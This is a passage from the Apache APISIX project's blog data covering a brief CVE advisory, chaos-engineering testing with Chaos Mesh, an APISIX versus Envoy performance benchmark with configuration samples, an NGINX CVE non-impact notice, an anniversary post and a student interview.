separate control plane and data plane, the data plane cluster of Apache APISIX can be scaled up separately without scaling up Apache APISIX Ingress Controller.\\n- **Operation and Maintenance Friendly**: Under the current architecture, users can choose to deploy the dataplane Apache APISIX cluster in a Kubernetes cluster or in a physical machine environment as the case may be. And Apache APISIX Ingress Controller failure will not have any impact on business traffic."},{"id":"2021/06/17/apache-apisix-dashboard-access-control-bypass-vulnerability-announcement","metadata":{"permalink":"/blog/2021/06/17/apache-apisix-dashboard-access-control-bypass-vulnerability-announcement","source":"@site/blog/2021/06/17/Apache-APISIX-Dashboard-Access-Control-Bypass-Vulnerability-Announcement.md","title":"APISIX Dashboard Access Control Bypass Vulnerability Advisory (CVE-2021-33190)","description":"Cloud native API gateway Apache APISIX Dashboard Access Control bypass vulnerability announcement, please upgrade the version as soon as possible to fix this vulnerability.","date":"2021-06-17T00:00:00.000Z","formattedDate":"June 17, 2021","tags":[{"label":"Vulnerabilities","permalink":"/blog/tags/vulnerabilities"}],"readingTime":1.255,"truncated":true,"authors":[{"name":"Zhiyuan Ju","url":"https://github.com/juzhiyuan","imageURL":"https://avatars.githubusercontent.com/u/2106987?v=4"}],"prevItem":{"title":"APISIX Ingress Controller 1.0 Release","permalink":"/blog/2021/06/18/first-ga-version-v1.0-of-apache-apisix-ingress-controller-released"},"nextItem":{"title":"Chaos Mesh Helps Apache APISIX Improve Stability","permalink":"/blog/2021/06/16/chaos-mesh-helps-apache-apisix-improve-stability"}},"content":"> Because the application makes access control determinations by obtaining the value of the request header `X-Forwarded-For`, an attacker can achieve an access control bypass attack by simply tampering with that request header when invoking the API request.\\n\\n\x3c!--truncate--\x3e\\n\\n## Problem Description\\n\\nIn Apache APISIX Dashboard 2.6, there are two configuration entries.\\n\\n1. the `conf.listen.host` configuration item, which specifies which IP address ManagerAPI listens to at startup, and which defaults to `0.0.0.0` (listens to external network requests by default).\\n\\n2. the configuration item `conf.allow_list`, which is used for access control and only allows access to `127.0.0.1` (i.e. local network) by default.\\n\\nSince the program makes access control determinations by obtaining the value of the request header `X-Forwarded-For`, an attacker can achieve an access control bypass attack by simply tampering with this request header when invoking an API request.\\n\\n## Affected Versions\\n\\nApache APISIX 2.6.0\\n\\n## Solution\\n\\nThis issue has been resolved in version 2.6.1. Please update to the latest version as soon as possible and change the default username and password after deploying the application.\\n\\n## Vulnerability details\\n\\nVulnerability public date: June 8, 2021\\n\\nCVE details: https://nvd.nist.gov/vuln/detail/CVE-2021-33190\\n\\n## Contributor Profile\\n\\nThis vulnerability was discovered by Vern at Ping An Technology Galaxy Security Lab and reported to the Apache Software Foundation. Thanks to Vern and Ping An Technology Galaxy Security Lab for their contributions to the Apache APISIX community.\\n\\n![2021-06-17-1](https://static.apiseven.com/202108/1639463130837-f27bf7bf-28b9-4742-a40f-ee43ebf5a7a8.jpeg)\\n\\n## Expanded Reading\\n\\n[Apache APISIX Contributor Interview | Pengcheng Wang, Senior Security Consultant, PwC South China Data Security & Privacy Team](./2021-01-11-interview-Apache-APISIX-contributor-Wang-Pengcheng-Senior-Security-Advisor-of-PwC-South-China-Data-Security-and- Privacy-Protection-Team.md)"},{"id":"2021/06/16/chaos-mesh-helps-apache-apisix-improve-stability","metadata":{"permalink":"/blog/2021/06/16/chaos-mesh-helps-apache-apisix-improve-stability","source":"@site/blog/2021/06/16/Chaos-Mesh-helps-Apache-APISIX-improve-stability.md","title":"Chaos Mesh Helps Apache APISIX Improve Stability","description":"This article introduces how to use Chaos Mesh to test the related processes and scenarios of API gateway Apache APISIX to improve the stability of APISIX.","date":"2021-06-16T00:00:00.000Z","formattedDate":"June 16, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.255,"truncated":true,"authors":[{"name":"Shuyang Wu","url":"https://github.com/Yiyiyimu","imageURL":"https://avatars.githubusercontent.com/u/34589752?v=4"}],"prevItem":{"title":"APISIX Dashboard Access Control Bypass Vulnerability Advisory (CVE-2021-33190)","permalink":"/blog/2021/06/17/apache-apisix-dashboard-access-control-bypass-vulnerability-announcement"},"nextItem":{"title":"Apache APISIX v.s Envoy: Which Has the Better Performance?","permalink":"/blog/2021/06/10/apache-apisix-and-envoy-performance-comparison"}},"content":"> This article describes how to use Chaos Mesh in a variety of scenarios to improve stability for Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\nApache APISIX is a top-level project under the Apache Foundation and has been tested in production environments with tens of billions of requests per day. As the community has grown, Apache APISIX has become more and more powerful, requiring more and more interactions with external components, and the uncertainty that comes with it has grown exponentially. We have received some feedback from users in the community, and here are two examples.\\n\\n## Scenario 1\\n\\nIn the Apache APISIX configuration center, when there is unexpectedly high network latency between etcd and Apache APISIX, can Apache APISIX still operate normally for traffic filtering and forwarding?\\n\\n## Scenario 2\\n\\nUser feedback in an issue reports errors interacting with the Apache APISIX admin API when a node in the etcd cluster fails while the cluster is still operational.\\n\\nWhile Apache APISIX covers most scenarios in CI with unit / e2e / fuzz testing, it does not yet cover interactions with external components. Can Apache APISIX give appropriate error messages when network fluctuations, hard disk failures, or unpredictable abnormal behavior such as process kill occurs, and can it maintain or restore itself to a normal state of operation? In order to test the coverage of the scenarios proposed by users and to proactively identify similar issues before putting it into production, the community decided to use Chaos Mesh, PingCAP\'s open source chaos engineering platform, for testing.\\n\\nChaos engineering is a method of experimenting on the system infrastructure to proactively identify vulnerabilities in the system, thus ensuring that the system is resilient to runaway environments in production. Chaos engineering was first proposed by Netflix to simulate and thus counteract the instability of early cloud services. As the technology has evolved, chaos engineering platforms now offer a wider variety of faults to inject and rely on Kubernetes to more easily control the fault radius. These are all important reasons why Apache APISIX chose Chaos Mesh, but as an open source community, Apache APISIX understands that only an active community can ensure stable use and rapid iteration of the software, and this is what makes Chaos Mesh even more appealing.\\n\\n## How to Apply Chaos Engineering on APISIX\\n\\nChaos Engineering has evolved into a complete methodology beyond the mere injection of faults. According to the recommendations of Principle of Chaos Engineering, deploying chaos engineering experiments requires five steps.\\n\\n1. define the steady state, i.e., find a quantifiable metric that proves proper operation.\\n2. make a hypothesis that the metric always remains in steady state in both the experimental and control groups.\\n3. design the experiment to introduce possible failures in operation.\\n4. test the hypothesis, i.e., falsify the hypothesis by comparing the results of the experimental and control groups.\\n5. fix the problem.\\n\\nThe next two user feedback scenarios are used as examples to introduce the process of applying chaos engineering to Apache APISIX according to these five steps.\\n\\n### Scenario 1\\n\\n![2021-06-16-1](https://static.apiseven.com/202108/1639462804552-8d51872f-3419-4e64-b365-4ef7cbb2a388.png)\\n\\nDescribe this scenario in a diagram. Against the five steps above, you first need to find quantifiable metrics that measure the proper functioning of Apache APISIX. The primary method of testing is to use Grafana to monitor Apache APISIX performance metrics. Once measurable metrics are found, the data can be extracted separately from Prometheus in the CI for comparison. Another point is that the logs need to be analyzed. Another point is the need to analyze logs, which for Apache APISIX is to look at Nginx error.log to determine whether errors are reported and whether they are expected.\\n\\nIn the control group, before Chaos was introduced, we tested that set/get route was successful, etcd was connectable, and recorded the RPS at that time. There is no significant change in RPS compared to before. The experiment is as expected.\\n\\n### Scenario 2\\n\\n![2021-06-16-2](https://static.apiseven.com/202108/1639462935848-b87400d3-e59b-4e6d-84f9-25c2771d48d3.png)\\n\\nIntroducing pod-kill chaos after performing the same control group experiment reproduces the expected error. In the case of randomly deleting a few etcd nodes in the cluster, etcd connectivity exhibited sporadic behavior, and the logs printed a large number of connection denied errors. More interestingly, the setup route returned normally when deleting the first or third node in the etcd endpoint list, and only when deleting the second node in the etcd endpoint list did the setup route report the error \\"connection refused\\".\\n\\nThe reason for this is that the etcd lua API used by Apache APISIX does not select endpoints randomly, but sequentially, so the operation performed by the new etcd client is equivalent to binding to only one etcd endpoint, resulting in a persistent failure. After fixing this issue, a health check was added to the etcd lua API to ensure that it does not duplicate a lot on a disconnected etcd, and a fallback check was added for when an etcd cluster is completely disconnected to avoid blowing up the log with a lot of errors.\\n\\n## Future plans\\n\\n### 1. Chaos testing with e2e simulation scenarios\\n\\nCurrently in Apache APISIX, it still relies heavily on people to identify possible vulnerabilities in the system for testing fixes. For the open source community, unlike the previously mentioned Netflix application of chaos engineering in the enterprise, while testing in CI without worrying about the impact of the failure radius of chaos engineering on the production environment, it also does not cover the complex and comprehensive scenarios in the production environment.\\n\\nIn order to cover more scenarios, the future community plans to simulate more complete scenarios using the existing e2e tests for a larger and more randomized chaos testing.\\n\\n### 2. Adding Chaos Testing to More Apache APISIX Projects\\n\\nIn addition to finding more possible vulnerabilities for Apache APISIX, the community plans to add chaos testing to more projects such as Apache APISIX Dashboard and Apache APISIX Ingress Controller.\\n\\n### 3. Adding Features to Chaos Mesh\\n\\nWhen deploying Chaos Mesh, we have encountered some features that are not supported at the moment, including the target of network latency does not support the selection of service, network chaos can not specify the container port injection, etc. The Apache APISIX community will also help Chaos Mesh to add related features in the future. We hope that the open source community will get better and better."},{"id":"2021/06/10/apache-apisix-and-envoy-performance-comparison","metadata":{"permalink":"/blog/2021/06/10/apache-apisix-and-envoy-performance-comparison","source":"@site/blog/2021/06/10/Apache-APISIX-and-Envoy-performance-comparison.md","title":"Apache APISIX v.s Envoy: Which Has the Better Performance?","description":"The performance of the cloud native API gateway Apache APISIX is stronger than that of Envoy when multiple workers are enabled.","date":"2021-06-10T00:00:00.000Z","formattedDate":"June 10, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.98,"truncated":true,"authors":[{"name":"Yuansheng Wang","url":"https://github.com/membphis","imageURL":"https://avatars.githubusercontent.com/u/6814606?v=4"}],"prevItem":{"title":"Chaos Mesh Helps Apache APISIX Improve Stability","permalink":"/blog/2021/06/16/chaos-mesh-helps-apache-apisix-improve-stability"},"nextItem":{"title":"Apache APISIX not affected by NGINX CVE-2021-23017","permalink":"/blog/2021/06/07/apache-apisix-not-affected-by-nginx-cve-2021-23017"}},"content":"> This article introduces the performance comparison between Apache APISIX and Envoy under certain conditions. In general, APISIX is slightly better than Envoy in terms of response latency and QPS, and APISIX has more advantages than Enovy when multiple worker processes are enabled due to the collaborative approach of NGINX in high concurrency scenarios. The performance and latency of APISIX makes it a massive throughput capability in handling north-south traffic.\\n\\n\x3c!--truncate--\x3e\\n\\nI learned about Envoy at the CNCF technology sharing session and did performance tests on Apache APISIX and Envoy after the session.\\n\\nAt a technical sharing session organized by CNCF, I heard about Envoy for the first time, and the guest speaker talked a lot about it, but all I can recall is a particularly novel concept \u201ccommunication bus\u201d. This is how the official website describes it.\\n\\n\u201cEnvoy is an L7 proxy and communication bus designed for large modern SOA (Service Oriented Architecture) architectures\u201d\\n\\nIn other words, Envoy is to solve the Server Mesh field and the birth of L7 proxy software. I found a diagram online. My understanding of Envoy is probably the following deployment architecture (please correct me if I am wrong).\\n\\nSince it is a proxy software for L7, as an experienced user in the OpenResty community for many years, naturally I can\u2019t help but use it to engage in comparison.\\n\\nThe object we chose to test is Apache APISIX, which is an API gateway based on OpenResty implementation. (In fact, it is also an L7 proxy and then added routing, authentication, flow restriction, dynamic upstream, and other features)\\n\\nWhy did I choose it? Because once I heard about the great routing implementation of this product during a community share. Since our business routing system is in a mess, I downloaded the source code of Apache APISIX and found that it is an awesome API gateway, beating all similar products I\u2019ve seen, so I was impressed by it!\\n\\nHere is a diagram from the Apache APISIX official website, a diagram explains things better than words, you can see how Apache APISIX works.\\n\\n![APISIX architechture](https://static.apiseven.com/202108/20210617002.png)\\n\\nLet\u2019s get started, first we go to the official website to find the most versions of two products: Apache APISIX 1.5 and Envoy 1.14 (the latest version at the time of writing this article).\\n\\n## Build Environment Preparation\\n\\n- Stress test client: wrk.\\n- Testing main metrics including: gateway latency, QPS and whether it scales linearly.\\n- Test environment: Microsoft Cloud Linux (ubuntu 18.04), Standard D13 v2 (8 vcpus, 56 GiB memory).\\n- Test method 1: single-core run for side-by-side comparison (since they are both based on epoll IO model, single-core crush test is used to verify their processing power).\\n- Test method 2: using multicore to run a side-by-side comparison, mainly to verify whether their overall processing power can grow linearly under the scenario of adding more (processes|threads).\\n\\n## Test Scenarios\\n\\nWe built an upstream server with NGINX, configured it with 2 workers, and received a request to directly answer 4k content, with the following reference configuration:\\n\\n```text\\nserver {\\n  listen 1980;\\n\\n  access_log off;\\n  location = /hello {\\n    echo_duplicate 400 \\"1234567890\\";\\n  }\\n}\\n```\\n\\n- The network architecture schematic is as follows: (green normal load, not run full. Red is a high pressure load, to run the process resources full, mainly CPU)\\n\u662f CPU\uff09\\n\\n![test result](https://static.apiseven.com/202108/20210617003.png)\\n\\n## Route Configuration\\n\\nFirst we find the Apache APISIX Getting Started configuration guide and we add a route to /hello with the following configuration:\\n\\n```text\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -X PUT -d \'{\u3001\\n    \\"uri\\": \\"/hello\\",\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        }\\n    }}\'\\n```\\n\\nNote that the proxy_cache and proxy_mirror plugins are not started here, as Envoy does not have similar functionality.\\n\\nThen we add a route to Envoy by referring to the official Envoy pressure test guide:\\n\\n```text\\nstatic_resources:\\n  listeners:\\n  - name: listener_0\\n    address:\\n      socket_address: { address: \\"0.0.0.0\\", port_value: 10000 }\\n\\n    filter_chains:\\n    - filters:\\n      - name: envoy.http_connection_manager\\n        config:\\n          generate_request_id: false,\\n          stat_prefix: ingress_http\\n          route_config:\\n            name: local_route\\n            virtual_hosts:\\n            - name: local_service\\n              domains: [\\"*\\"]\\n              routes:\\n              - match: { prefix: \\"/hello\\" }\\n                route: { cluster: service_test }\\n          http_filters:\\n          - name: envoy.router\\n            config:\\n              dynamic_stats: false\\n  clusters:\\n  - name: service_test\\n    connect_timeout: 0.25s\\n    type: LOGICAL_DNS\\n    dns_lookup_family: V4_ONLY\\n    lb_policy: ROUND_ROBIN\\n    hosts: [{ socket_address: { address: \\"127.0.0.1\\", port_value: 1980 }}]\\n    circuit_breakers:\\n      thresholds:\\n        - priority: DEFAULT\\n          max_connections: 1000000000\\n          max_pending_requests: 1000000000\\n          max_requests: 1000000000\\n          max_retries: 1000000000\\n        - priority: HIGH\\n        max_connections: 1000000000\\n        max_pending_requests: 1000000000\\n        max_requests: 1000000000\\n        max_retries: 1000000000\\n```\\n\\nThe `generate_request_id`, `dynamic_stats` and `circuit_breakers` sections above are turned on by default inside Envoy, but they are not used in this compression test and need to be turned off explicitly or set to oversize thresholds to improve performance (Can someone explain to me why this is so complicated to configure...).\\n\\n## Results\\n\\nSingle route without any plugins turned on. Turn on different CPU counts for full load stress test.\\n\\nNote: For NGINX called worker number, Envoy is concurrent, in order to unify the number of workers called after.\\n\\n| **Workers**    | **APISIX QPS** | **APISIX Latency** | **Envoy QPS** | **Envoy Latency** |\\n| :------------ | :------------- | :----------------- | :------------ | :---------------- |\\n| **1 worker**  | 18608.4        | 0.96               | 15625.56      | 1.02              |\\n| **2 workers** | 34975.8        | 1.01               | 29058.135     | 1.09              |\\n| **3 workers** | 52334.8        | 1.02               | 42561.125     | 1.12              |\\n\\nNote: The raw data is publicly available at [gist](https://gist.github.com/aifeiasdf/9fc4585f6404e3a0a70c568c2a14b9c9) preview.\\n\\n![test result](https://static.apiseven.com/202108/20210617004.png)\\n\\nQPS: The number of requests completed per second, the higher the number the better, the higher the value means the more requests can be completed per unit time. From the QPS results, Apache APISIX performance is about 120% of Envoy\u2019s, and the higher the number of cores, the bigger the QPS difference.\\n\\nLatency: Latency per request, the smaller the value the better. It represents how long it takes to receive an answer per request from the time it is sent. For reverse proxy scenarios, the smaller the value, the smaller the impact on the request will be. From the results, Envoy\u2019s per-request latency is 6\u201310% more than Apache APISIX, and the higher the number of cores the higher the latency.\\n\\nWe can see that the difference between the two metrics in the single-worker thread|process mode, QPS and Latency is not large, but with the increase in the number of threads|processes their gap is gradually enlarged, here I analyze that there may be two reasons, NGINX in the high concurrency scenario with multiple workers and the system IO model for interaction is not more advantageous, on the other hand, also On the other hand, NGINX itself may be more \u201cstingy\u201d in terms of memory and CPU usage in its implementation, so that the cumulative performance advantage can be evaluated in detail later.\\n\\n## Conclusion\\n\\nIn general, Apache APISIX is slightly better than Envoy in terms of response latency and QPS, and due to NGINX\u2019s multi-worker collaboration method, which is more advantageous in high concurrency scenarios, Apache APISIX\u2019s performance improvement is more obvious than Envoy\u2019s after opening multiple worker processes. The bus design of Envoy gives it a unique advantage in handling east-west traffic, while the performance and latency of Apache APISIX gives it a massive throughput capability in handling north-south traffic.\\nApache APISIX"},{"id":"2021/06/07/apache-apisix-not-affected-by-nginx-cve-2021-23017","metadata":{"permalink":"/blog/2021/06/07/apache-apisix-not-affected-by-nginx-cve-2021-23017","source":"@site/blog/2021/06/07/Apache-APISIX-not-affected-by-NGINX-CVE-2021-23017.md","title":"Apache APISIX not affected by NGINX CVE-2021-23017","description":"Cloud-native API gateway Apache APISIX is not affected by the NGINX (CVE-2021-23017) vulnerability.","date":"2021-06-07T00:00:00.000Z","formattedDate":"June 7, 2021","tags":[{"label":"Vulnerabilities","permalink":"/blog/tags/vulnerabilities"}],"readingTime":1.5,"truncated":true,"authors":[{"name":"Ruofei Zhao","url":"https://github.com/Serendipity96","imageURL":"https://avatars.githubusercontent.com/u/23514812?v=4"}],"prevItem":{"title":"Apache APISIX v.s Envoy: Which Has the Better Performance?","permalink":"/blog/2021/06/10/apache-apisix-and-envoy-performance-comparison"},"nextItem":{"title":"Apache APISIX Open Source 2 Year Anniversary!","permalink":"/blog/2021/06/06/apisix-two-years"}},"content":"> On May 26, NGINX issued a security announcement that fixed a DNS resolver vulnerability (CVE -2021-23017) in the NGINX resolver.\\n\\n\x3c!--truncate--\x3e\\n\\n`ngx_resolver_copy()` handles DNS responses with errors. When the \\"resolver\\" instruction is used in the NGINX configuration file, it might allow an attacker who is able to forge UDP packets from the DNS server to cause 1-byte memory overwrite, resulting in worker process crash or other potential impacts.\\n\\nVulnerability level: high risk, CVSS score 8.1\\n\\nAffected versions: NGINX 0.6.18 - 1.20.0\\n\\nIf you want to know more details, you can visit the following link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-23017\\n\\nTwo days before this security vulnerability was disclosed, on May 24, [Apache APISIX released version 2.6](https://mp.weixin.qq.com/s?__biz=MzI1MDU3NjQ5OA==&mid=2247485444&idx=1&sn=5b0bab964490dc2d7a7b25262d9396b2&chksm=e9816319def6ea0fbdafa69426718184e042d6d1cde1d20e410e6ee414756960273f9d625bd2&scene=21#wechat_redirect). This version contains many excellent features, such as support for using Java to write plugins. Apache APISIX 2.6 is not affected by this vulnerability.\\n\\nApache APISIX only uses some features of NGINX, other core functions, such as:\\n\\n- Route matching\\n- IP matching\\n- DNS resolve\\n- Dynamic Upstream\\n- Dynamic Certificate\\n\\nare all implemented by Apache APISIX instead of the built-in mechanism of NGINX, so it will not be affected by this security vulnerability.\\n\\n## Apache APISIX\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway that provides rich traffic management features  such as load balancing, dynamic upstream, canary release, service meltdown , authentication , observability and so on.\\n\\nYou can use Apache APISIX to handle traditional north-south traffic, as well as east-west traffic between services.\\n\\nIn the cloud-native era, dynamic and observability are standard features of API gateway.\\n\\nThis architecture of Apache APISIX can not only meet the elastic scaling and rapid release under the cloud-native architecture, but also be more efficient, flexible and secure. It also cooperates with SkyWalking deeply in observability,  improving service management capability greatly.\\n\\nWelcome to follow and use Apache APISIX: https://github.com/apache/apisix"},{"id":"Apache APISIX Open Source 2 Year Anniversary!","metadata":{"permalink":"/blog/2021/06/06/apisix-two-years","source":"@site/blog/2021/06/06/apisix-two-years.md","title":"Apache APISIX Open Source 2 Year Anniversary!","description":"API gateway Apache APISIX has been open source for two years, during which time health checks, service interruption, service discovery, etc. have been implemented.","date":"2021-06-06T00:00:00.000Z","formattedDate":"June 6, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.04,"truncated":true,"authors":[{"name":"Ruofei Zhao","url":"https://github.com/Serendipity96","imageURL":"https://avatars.githubusercontent.com/u/23514812?v=4"}],"prevItem":{"title":"Apache APISIX not affected by NGINX CVE-2021-23017","permalink":"/blog/2021/06/07/apache-apisix-not-affected-by-nginx-cve-2021-23017"},"nextItem":{"title":"First Experience with Apache APISIX Shared by Student in OSPP 2020","permalink":"/blog/blog/2021/06/03/firsthand-experience-with-apache-apisix-from-ospp-2020-students"}},"content":"> Apache APISIX is open for 2 years!\\n\\n\x3c!--truncate--\x3e\\n\\nToday is June 6, 2021, and on this 666th day [Apache APISIX](https://github.com/apache/apisix) is 2 years old! \ud83c\udf89\\n\\nApache APISIX was open sourced on June 6, 2019, and entered the Apache Incubator in October of the same year, and has become an **Apache top project** in just two years!\\n\\nBefore entering the Apache Incubator, Apache APISIX had just over 20 contributors, and now there are 249 contributors to projects related to Apache APISIX, a 10-fold increase in **contributors** in a year and a half! The Apache APISIX community is also very active, with **249 contributors submitting 2303 PRs as of today, and a new release every month**.\\n\\n![2019.6.6 ~ 2021.6.6 contributor growth curve](https://static.apiseven.com/202108/1630116210945-cdf0888f-c823-4eae-b404-3b1d6cb1b1e6.png)\\n\\nIn life, when you go to buy airline tickets, swipe Weibo, or buy milk tea, the critical traffic behind it is handled by Apache APISIX. In the past two years, Apache APISIX has been widely used by many enterprises, covering finance, Internet, manufacturing, retail, operators, etc., such as NASA in the US, Digital Factory in the EU, China Airlines, Tencent, Huawei, Weibo, Shell House, China Mobile, Taikang, 360, Nespresso Tea, etc. Click to view [list of users of Apache APISIX](https://github.com/apache/apisix).\\n\\n**In August 2019, Apache APISIX released its first version 0.6.0**. This release brought many new features: health checks, service fusion, debug mode, distributed tracing, JWT authentication, etc., and a built-in dashboard.\\n\\nVersion **1.0 was released in January 2020 and was the first production release of Apache APISIX.** This version not only supports new features - matching to different upstream services based on header, args, priority, etc. with the same URI - but also improves code stability and documentation, such as adding documentation for custom development plugins, documentation for using the Oauth plugin, documentation for documentation for dashboard compilation, documentation on how to perform a/b testing, documentation on how to enable the MQTT plugin, etc., indicating that Apache APISIX is starting to be used in more and more environments.\\n\\n**A new release every month, and we mean it!** In October 2020, we released version 2.0. 2.0 migrates from etcd v2 protocol to v3, supports only etcd 3.4 and later, supports adding tags to upstream objects, adds more fields to upstream, routing and other resources, uses interceptors to protect the plugin\'s routes, supports http and https listening on multiple ports, adds AK/SK (HMAC) authentication plugin, referer-restriction plugin.\\n\\n**16 days ago, we released APISIX version 2.6!** In this version, new features that have been highly requested are supported, such as: **Writing custom plugins in other languages, custom plugins in Java are now supported, and custom plugins in Go will be supported at the end of this month!** In addition, version 2.6 of ecology has full support for Nacos service discovery, support for configuring DNS resolver for IPv6, and support for modifying the Prometheus default port so that it is no longer exposed to the data-plane port.\\n\\nApache APISIX aims to be more than just an API gateway, **Apache APISIX wants to be a Layer 4 and 7 traffic handler and connector in the cloud-native era.** All configurations in Apache APISIX are dynamic, which is important for elastic scaling and multi-cloud deployments in the cloud-native era. We believe that Apache APISIX is the best choice for the cloud-native era. Welcome to the Apache APISIX open source community, and welcome to Apache APISIX!\\n\\nThe development of Apache APISIX cannot be achieved without each and every one of the community members, **Special thanks to the contributors and users of the Apache APISIX community for their contributions to the development of Apache APISIX.**!\\n\\n![apisix contributors](https://static.apiseven.com/202108/1630468565074-c7e83b82-c40d-4c56-bc66-d1be2acc645b.jpeg)\\n\\nApache APISIX is 2 years old now, happy birthday!"},{"id":"/blog/2021/06/03/firsthand-experience-with-apache-apisix-from-ospp-2020-students","metadata":{"permalink":"/blog/blog/2021/06/03/firsthand-experience-with-apache-apisix-from-ospp-2020-students","source":"@site/blog/2021/06/03/firsthand-experience-with-apache-apisix-shared-by-student-participants-in-ospp-2020.md","title":"First Experience with Apache APISIX Shared by Student in OSPP 2020","description":"In this interview, we invited two Apache APISIX committers to share their experience with Apache APISIX in the Summer 2020 of Open Source Promotion Plan.","date":"2021-06-03T00:00:00.000Z","formattedDate":"June 3, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":6.59,"truncated":true,"authors":[{"name":"Ruofei Zhao","url":"https://github.com/Serendipity96","imageURL":"https://avatars.githubusercontent.com/u/23514812?v=4"}],"prevItem":{"title":"Apache APISIX Open Source 2 Year Anniversary!","permalink":"/blog/2021/06/06/apisix-two-years"},"nextItem":{"title":"Apache APISIX Release 2.6.0","permalink":"/blog/2021/05/25/apache-apisix-2.6.0-release"}},"content":"> This interview features two students who participated in the Summer 2020 of Open Source Promotion Plan, both of whom are now Apache APISIX committers and OSPP 2021 mentors for APISIX-related projects.\\n\\n\x3c!--truncate--\x3e\\n\\n## Guest speaker: Shuyang Wu\\n\\n![yiyiyimu](https://static.apiseven.com/202108/1630546588578-2d8386cd-06c0-4c71-848a-8ed0e1263a4e.png)\\n\\n**Q: Shuyang, please briefly introduce yourself.**\\n\\n**Shuyang**: Hi, I\'m WU Shuyang. I graduated from the School of Environmental Science and Engineering at Shanghai JiaoTong University last year, and I will start a Master\'s degree in Computer Science at Georgia Tech this August. I am currently working full-time at API7.ai, the commercial company offering paid technical support for APISIX and enterprise products, to maintain the open source community, and I am also a committer for both Apache APISIX and Chaos Mesh projects. Last year, I completed the project \\"Support etcd v3 protocol\\" in Apache APISIX, which is the highlight of APISIX v2.0, and was honored to be awarded as one of the outstanding students in the Summer 2020 of Open Source Promotion Plan. This year, I will participate in the Summer 2021 of Open Source Promotion Plan as a mentor.\\n\\n**Q: Why did you participate in OSPP 2020 last year?**\\n\\n**Shuyang**: Last year, I stayed home with my parents for a while because of the COVID-19 pandemic. During this period, I tried to find a project for which I could work as an intern remotely. Luckily, I found the open source project Apache APISIX (Join us! We work fully remote!) and the OSPP event. Compared to the GSOC and Community Bridge, the Open Source Promotion Plan has a very high selection rate because there are a great number of projects and each project has its slot. Here are the statistics: **There were a total of 397 projects, 219 applications, and 185 wins in OSPP 2020. If I signed up for three projects, the hit rate was more than 99%. So though I had no record on the Github Contribution Graph, I could still get enrolled in the plan.**\\n\\n**Q: Why did you choose the Apache APISIX project last year?**\\n\\n**Shuyang**: I took a screenshot of the PPT from last year\'s conference. For those who had a clear goal and interest, they didn\'t need to think much about how to choose a project. But on my part, I had no idea about it. Applicants like me may choose a project with a high star count, but in fact, **the star count only indicates the popularity of the project rather than the pulse of the community which indicates how much help you can get from the community. An active community will benefit you from two aspects, guiding you through the first stage of your journey and offering extensive and constructive feedback while you do the maintaining work for the community.**\\n\\n![Apache APISIX Stats on Github](https://static.apiseven.com/202108/1649237784272-8fddf8cb-0ba7-4040-86f9-014cb25cdca6.jpg)\\n\\n**Shuyang**: **The metrics I chose at the time are response duration (whether you can get a timely response when you bring up an issue), number of good first issues (whether there is a good issue to help you get a good start by increasing your understanding of the project and increasing your visibility), and insights (the overall activity of the community).** This year we developed a small tool to track the [contributors](https://github.com/api7/contributor-graph) statistics in our company, so you can get a clear insight into the growth of the contributor base and the number of monthly active contributors, which are also meaningful metrics.\\n\\n![How to Contribute](https://static.apiseven.com/202108/1649238296632-c5b31d4b-0af4-41eb-a72a-4ee1ab68e0d0.jpg)\\n\\n**Shuyang**: Before I got involved with APISIX last year, I knew nothing about the technology stacks required for the project, including Lua, OpenResty, etcd, and even API gateways, but I got up to speed very quickly. I was able to run a few demos with the help of the documentation, and I was able to get started with Lua in half a day. Here I\'d like to share with you two must-have materials for new OpenResty learners, namely a free e-book and a series of paid courses on the GeekTime App, both created by WEN Ming, the PMC Chair of Apache APISIX. These two materials did help me a lot.\\n\\n**Q: What is your takeaway from having been engaged in the Apache APISIX community?**\\n\\n**Shuyang**: The most rewarding part was learning for the first time how **a large project works**. Probably because I changed my major, the projects I did at school or on my own were only toy projects, but participating in the open source community was the first time I learned how to develop and maintain a project for production use. It was also a great experience to meet so many geeks and open-source lovers from different backgrounds in the community. Also many thanks to my mentor nic-chen for guiding me through the journey.\\n\\n**Q: How did you become a committer? Could you share some tips with us?**\\n\\n**Shuyang**: The main reason is that I have contributed many features, and in an open-source community, sharing and collaboration are essential to the community. By offering help, replying to issues, reviewing PRs, and participating in discussions about new features on the mailing list, I got along well with others in the community.\\n\\n**Q: What would you like to say to the students who want to participate in the Summer 2021 of Open Source Promotion Plan?**\\n\\n**Shuyang**: Sign up for the activity. Don\'t hesitate and worry too much. Just engage yourself in the community and enjoy the three-month-long coding journey. Have fun\uff01\\n\\n## Sharing Guest: Zeping Bai\\n\\n![Zeping Bai](https://static.apiseven.com/202108/1630546751119-8df77cd8-6be0-4f8e-af13-182e77462d73.png)\\n\\n**Q: Hi Zeping, please make a brief introduction of yourself.**\\n\\n**Zeping**: I\'m BAI Zeping, majoring in Business Management at Tianjin University of Commerce. This is my junior year at college. I\'ve been teaching myself programming since I was in junior high school, and it\'s become one of my hobbies. I specialize in front-end web development and back-end development. I also tried Android development. The three coding languages I use most are Golang, PHP, and JavaScript.\\n\\n**Q: Why did you participate in the Summer 2020 of Open Source Promotion Plan and choose the Apache APISIX project?**\\n\\n**Zeping**: When I was using the control panel of the Apache APISIX gateway, I found that some features were not supported, so I committed some code for the new features. In the Apache APISIX community, there are many tech-savvy contributors, from who I learned a lot, built up my confidence, and gained the motivation to contribute to more open-source projects. Last year, I applied for other community-based projects in GSoC, but I didn\'t get enrolled. Then I got to know the OSPP 2020, so I signed up for it.\\n\\n**Q: This year you are a mentor for the Apache APISIX project. What tips do you have for those who want to participate in the project?**\\n\\n**Zeping**: First, elaborate on the project proposal or technical plans in the project application documents, and then briefly describe the process towards achieving project goals and the approximate time required. Besides, do make a self-introduction. With the above information, we can get a quick idea of your capabilities and project proposal. You can also contact the project supervisor in advance for complete project information.\\n\\n**Q: Is there anything you would like to share about this role change?**\\n\\n**Zeping**: Last year, when I participated in the OSPP 2020 as a student, I got a lot of guidance and 